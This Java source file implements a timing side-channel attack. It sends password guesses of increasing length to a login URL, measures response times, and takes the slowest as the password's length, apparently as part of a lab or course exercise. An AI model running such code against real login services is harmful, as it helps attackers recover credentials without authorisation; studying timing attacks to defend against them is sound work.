import java.util.ArrayList;
import java.util.Collections;

public class CheckPasswordLength {

    private String baseUrl;
    private String username;
    private ArrayList<Double> timeMeasurements;
    private final int maxLength = 32;

    public CheckPasswordLength(String baseUrl, String username) {
        this.baseUrl = baseUrl;
        this.username = username;
    }

    private String createUrl(String baseUrl, String username, String password, Integer difficulty){
        String url_format = baseUrl + "\\?user=%s\\&password=%s\\&difficulty=%d";
        String url = String.format(url_format,username, password, difficulty);
        return url;
    }

    /**
     * this function try different lengths and measure their connections to the site
     * fill the ArrayList with sum of times off all length
     */
    public void measureConnectionWithDifferentLength(){
        timeMeasurements = new ArrayList<>();
        timeMeasurements.add(0.0);
        String password = "a";
        for (int i=1; i<maxLength; i++){
            String url = createUrl(this.baseUrl, this.username, password, 2);
            URLRequest urlRequest = new URLRequest(url);
            double time = urlRequest.measureConnectionToGivenURL();
            System.out.println("total median time for length " +i+ " is " + time);
            timeMeasurements.add(urlRequest.measureConnectionToGivenURL());
            password+="a";
        }
    }


    /**
     * method to get the length of the password.
     * @return the index of max value in timeMeasurements array ==> the length of the password.
     */
    public int getLength(){
        for (double d: timeMeasurements){
            System.out.println(d);
        }
        double maxValue=  Collections.max(timeMeasurements);
        System.out.println("The max time of measurement is "+maxValue );
        return timeMeasurements.indexOf(maxValue);
    }


}
